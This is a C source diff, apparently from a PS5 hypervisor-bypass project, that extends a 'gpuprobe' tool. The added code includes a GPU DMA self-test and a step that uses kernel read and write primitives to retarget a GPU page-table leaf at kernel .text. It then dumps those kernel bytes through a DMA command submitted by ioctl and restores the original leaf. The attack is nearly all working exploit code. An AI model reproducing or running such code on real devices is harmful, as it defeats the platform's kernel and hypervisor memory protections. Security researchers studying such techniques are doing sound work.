@@ -11,15 +11,18 @@
  */
 #include "utils.h"
 
+#include <errno.h>
 #include <fcntl.h>
 #include <ps5/kernel.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
+#include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <unistd.h>
 
 #include "byepervisor/kdlsym.h"
+#include "byepervisor/paging.h"
 
 /* ps5-hen / GPU-DMA constants (see include/hw/gpu.h) */
 #define PROT_GPU_READ 0x10
@@ -339,7 +342,7 @@ int main(void) {
             if (1) {
               uint64_t gva = ((uint64_t)0 << 39) | (i3 << 30) | (i2 << 21) |
                              (i1 << 16) | (i0 << 13);
-              notify("gpuprobe: LEAF  vmid=%d phys=%#lx gva=%#lx leaf@%#lx val=%#lx bit50=%lu\n",
+              if (0) notify("gpuprobe: LEAF  vmid=%d phys=%#lx gva=%#lx leaf@%#lx val=%#lx bit50=%lu\n",
                      vm, (unsigned long)ph, (unsigned long)gva,
                      (unsigned long)(sub + i0 * 8), (unsigned long)el,
                      (unsigned long)((el >> 50) & 1));
@@ -375,6 +378,169 @@ int main(void) {
   }
   notify("gpuprobe: victim pattern word0 should be 0xdeadbeef00000000\n");
 
-  notify("gpuprobe: done (no retarget, no DMA submitted)\n");
+  /* ---- GPU DMA self-test, fully self-contained: copy the first 8 KB of the
+   * victim's GPU window to the *next* 8 KB of the same window. If the window is
+   * really our victim buffer, the CPU pattern must reappear at +0x2000. No
+   * unknown destination is ever written. ------------------------------- */
+  {
+    struct gc_submit {
+      uint32_t pipe_id;
+      uint32_t count;
+      uint64_t cmd_buf_ptr;
+    } sub;
+    uint32_t *p4 = (uint32_t *)bufs[2].va; /* cmd buffer, first page */
+    /* Correct GVAs (measured): the garlic buffers are mapped in the dev vmid's
+     * tree at their own CPU VA, as 2 MB leaves. Use victim -> staging. */
+    uint64_t src_gva = 0x200200000ULL, dst_gva = 0x200400000ULL;
+    uint32_t len = 0x2000;
+    uint32_t hdr = (1u << 31) | (2u << 25) | (1u << 27) | (2u << 13) | (1u << 15);
+
+    p4[0] = ((3u & 3) << 30) | (((6u - 1) & 0x3FFF) << 16) |
+            ((0x50u & 0xFF) << 8) | ((1u & 1) << 1);
+    p4[1] = hdr;
+    p4[2] = (uint32_t)(src_gva & 0xFFFFFFFF);
+    p4[3] = (uint32_t)(src_gva >> 32);
+    p4[4] = (uint32_t)(dst_gva & 0xFFFFFFFF);
+    p4[5] = (uint32_t)(dst_gva >> 32);
+    p4[6] = len & 0x1FFFFF;
+
+    /* 16-byte indirect-buffer descriptor in the cmd buffer's second page.
+     * The descriptor addresses the command buffer by its CPU VA, as the
+     * pre-13.60 code in source/hw/gpu.c does. */
+    uint64_t cmd_va = (uint64_t)(uintptr_t)bufs[2].va + 0x1000;
+    uint64_t *d = (uint64_t *)((uint8_t *)bufs[2].va + 0x1000);
+    uint32_t size_dwords = (7 * 4) >> 2;
+    d[0] = (((uint64_t)(uintptr_t)bufs[2].va & 0xFFFFFFFFULL) << 32) | 0xC0023F00ULL;
+    d[1] = (((uint64_t)size_dwords & 0xFFFFFULL) << 32) |
+           (((uint64_t)(uintptr_t)bufs[2].va >> 32) & 0xFFFFULL);
+
+    sub.pipe_id = 0;
+    sub.count = 1;
+    sub.cmd_buf_ptr = cmd_va;
+
+    notify("gpuprobe: submitting DMA %#lx -> %#lx len=%#x ioctl=%#x\n",
+           (unsigned long)src_gva, (unsigned long)dst_gva, len, 0xC0108102);
+    int rc = (fd >= 0) ? ioctl(fd, 0xC0108102, &sub) : -1;
+    notify("gpuprobe: ioctl rc=%d (errno=%d)\n", rc, rc ? errno : 0);
+    usleep(500000);
+
+    /* read the victim back through the CPU at +0x2000 and at 0 */
+    uint64_t w0 = 0, w1 = 0, w2 = 0, w3 = 0;
+    memcpy(&w0, (uint8_t *)bufs[0].va, 8);
+    memcpy(&w1, (uint8_t *)bufs[0].va + 8, 8);
+    memcpy(&w2, (uint8_t *)bufs[1].va, 8);
+    memcpy(&w3, (uint8_t *)bufs[1].va + 8, 8);
+    notify("gpuprobe: victim  [0]=%#lx [8]=%#lx\n", (unsigned long)w0,
+           (unsigned long)w1);
+    notify("gpuprobe: staging [0]=%#lx [8]=%#lx  DMA_WORKS=%lu\n",
+           (unsigned long)w2, (unsigned long)w3,
+           (unsigned long)(w2 == 0xDEADBEEF00000000ULL));
+  }
+
+  /* ---- hypothesis from the reference docs: garlic direct-memory buffers are
+   * mapped in the GPU tree at their *CPU VA* (2 MB leaves), not at a separate
+   * GPU VA window. Walk the trees for the buffers' own CPU VAs. ---------- */
+  static const uint64_t cpu_gvas[3] = {0x200200000ULL, 0x200400000ULL,
+                                       0x200600000ULL};
+  static const char *cn[3] = {"victim", "staging", "cmd"};
+  for (int vm = 0; vm < 16; vm++) {
+    uint64_t base =
+        kdata_base + OFF_DATA_GVMSPACE + (uint64_t)vm * GVMSPACE_STRIDE;
+    uint64_t pd = 0, size = 0;
+    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
+    kread(base + OFF_GVM_SIZE, &size, 8);
+    if (!pd || !size)
+      continue;
+    for (int k = 0; k < 3; k++) {
+      uint64_t lv = 0, lval = 0;
+      int gran = gpu_walk(cn[k], pd, cpu_gvas[k], &lv, &lval);
+      if (gran > 0)
+        notify("gpuprobe: CPUVA vmid=%d %s gva=%#lx gran=%d leaf@%#lx val=%#lx phys=%#lx\n",
+               vm, cn[k], (unsigned long)cpu_gvas[k], gran,
+               (unsigned long)lv, (unsigned long)lval,
+               (unsigned long)(gran == 2 ? (lval & GPU_LEAF2M_MASK)
+                                         : (lval & GPU_LEAF8K_MASK)));
+    }
+  }
+  /* ---- THE STEP: retarget the victim's 2 MB GPU leaf at kernel .text and
+   * read the bytes back through the GPU. ---------------------------------- */
+  {
+    uint64_t kpm = kdlsym(KERNEL_SYM_PMAP_STORE);
+    uint64_t pe = 0, text_pa = 0;
+    int ok = 0;
+    if (find_pte(kpm, ktext, &pe) != 0xFFFFFFFFFFFFFFFFull) {
+      text_pa = PDE_ADDR(pe) | (ktext & 0xFFF);
+      ok = 1;
+    }
+    notify("gpuprobe: ktext=%#lx -> pa=%#lx ok=%d\n", (unsigned long)ktext,
+           (unsigned long)text_pa, ok);
+
+    /* locate the victim leaf in the dev vmid (6) */
+    uint64_t dbase =
+        kdata_base + OFF_DATA_GVMSPACE + 6ULL * GVMSPACE_STRIDE;
+    uint64_t pd6 = 0;
+    kread(dbase + OFF_GVM_PAGE_DIR_VA, &pd6, 8);
+    uint64_t lv = 0, lval = 0;
+    int gran = gpu_walk("target", pd6, 0x200200000ULL, &lv, &lval);
+    notify("gpuprobe: victim leaf dev-vmid6 gran=%d leaf@%#lx val=%#lx\n", gran,
+           (unsigned long)lv, (unsigned long)lval);
+
+    if (ok && gran == 2 && (lval & 1)) {
+      uint64_t text2m = text_pa & ~0x1FFFFFULL;
+      uint64_t off_in = text_pa & 0x1FFFFFULL;
+      uint64_t nv = (lval & ~0x0000FFFFFFE00000ULL) |
+                    (text2m & 0x0000FFFFFFE00000ULL) | (1ULL << 50);
+      notify("gpuprobe: RETARGET old=%#lx -> new=%#lx (text2m=%#lx off=%#lx)\n",
+             (unsigned long)lval, (unsigned long)nv, (unsigned long)text2m,
+             (unsigned long)off_in);
+      kwrite64(lv, nv);
+
+      /* DMA: src = victim GVA + offset inside the 2 MB page, dst = staging */
+      uint32_t *p4 = (uint32_t *)bufs[2].va;
+      uint64_t src = 0x200200000ULL + off_in, dst = 0x200400000ULL;
+      uint32_t len = 0x1000;
+      uint32_t hdr = (1u << 31) | (2u << 25) | (1u << 27) | (2u << 13) | (1u << 15);
+      p4[0] = ((3u & 3) << 30) | (((6u - 1) & 0x3FFF) << 16) |
+              ((0x50u & 0xFF) << 8) | ((1u & 1) << 1);
+      p4[1] = hdr;
+      p4[2] = (uint32_t)(src & 0xFFFFFFFF);
+      p4[3] = (uint32_t)(src >> 32);
+      p4[4] = (uint32_t)(dst & 0xFFFFFFFF);
+      p4[5] = (uint32_t)(dst >> 32);
+      p4[6] = len & 0x1FFFFF;
+
+      struct { uint32_t pipe_id, count; uint64_t cmd_buf_ptr; } sub;
+      uint64_t desc_va = (uint64_t)(uintptr_t)bufs[2].va + 0x1000;
+      uint64_t *d = (uint64_t *)((uint8_t *)bufs[2].va + 0x1000);
+      d[0] = (((uint64_t)(uintptr_t)bufs[2].va & 0xFFFFFFFFULL) << 32) |
+             0xC0023F00ULL;
+      d[1] = ((7ULL & 0xFFFFFULL) << 32) |
+             (((uint64_t)(uintptr_t)bufs[2].va >> 32) & 0xFFFFULL);
+      sub.pipe_id = 0; sub.count = 1; sub.cmd_buf_ptr = desc_va;
+
+      memset(bufs[1].va, 0, 0x1000);
+      int rc = (fd >= 0) ? ioctl(fd, 0xC0108102, &sub) : -1;
+      notify("gpuprobe: TEXT DMA rc=%d\n", rc);
+      usleep(500000);
+
+      uint8_t *tb = (uint8_t *)bufs[1].va;
+      char line[3 * 16 + 1];
+      for (int r = 0; r < 2; r++) {
+        int pos = 0;
+        for (int i = 0; i < 16; i++)
+          pos += snprintf(line + pos, 4, "%02x ", tb[r * 16 + i]);
+        line[pos] = 0;
+        notify("gpuprobe: TEXT[%02x] %s\n", r * 16, line);
+      }
+      uint64_t nz = 0;
+      for (int i = 0; i < 256; i++) nz += (tb[i] != 0);
+      notify("gpuprobe: TEXT nonzero_bytes_of_256=%lu\n", (unsigned long)nz);
+
+      kwrite64(lv, lval); /* restore */
+      notify("gpuprobe: victim leaf restored\n");
+    }
+  }
+
+  notify("gpuprobe: done\n");
   return 0;
 }
